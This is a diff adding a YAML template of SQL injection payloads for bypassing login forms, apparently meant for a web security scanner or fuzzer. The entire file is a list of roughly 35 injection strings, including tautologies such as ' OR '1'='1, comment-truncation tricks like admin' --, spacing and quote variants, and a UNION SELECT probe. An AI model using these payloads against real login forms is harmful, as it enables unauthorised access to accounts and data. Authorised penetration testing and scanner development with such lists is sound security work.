@@ -1,0 +1,43 @@
+# Authentication Bypass SQL Injection Payloads
+# ---------------------------------------
+# This template focuses on payloads designed to bypass login forms
+
+payloads:
+  # Basic authentication bypass payloads
+  - "' OR '1'='1"
+  - "' OR '1'='1' --"
+  - "' OR '1'='1' #"
+  - "' OR '1'='1' /*"
+  - "admin' --"
+  - "admin' #"
+  - "admin'/*"
+  - "' OR 1=1 --"
+  - "') OR ('1'='1"
+  - "') OR ('1'='1' --"
+
+  # Case variations
+  - "' or '1'='1"
+  - "' OR 1=1"
+  - "admin'-- "
+  
+  # Different quote types
+  - "\" OR \"1\"=\"1"
+  - "\" OR \"1\"=\"1\" --"
+  
+  # Special characters
+  - "' OR 'x'='x"
+  - "') OR ('x'='x"
+  - "' OR 'a'='a"
+  
+  # Spaces variations
+  - "'OR'1'='1"
+  - "'OR'1'='1'--"
+  - "'OR/**/1=1"
+  
+  # More complex variants
+  - "' OR 1=1 LIMIT 1 --"
+  - "' OR 1=1 ORDER BY 1 --"
+  - "admin') OR ('1'='1"
+  - "admin') OR ('1'='1'--"
+  - "admin') OR ('1'='1'#"
+  - "') UNION SELECT 1,1,1 WHERE '1'='1" 
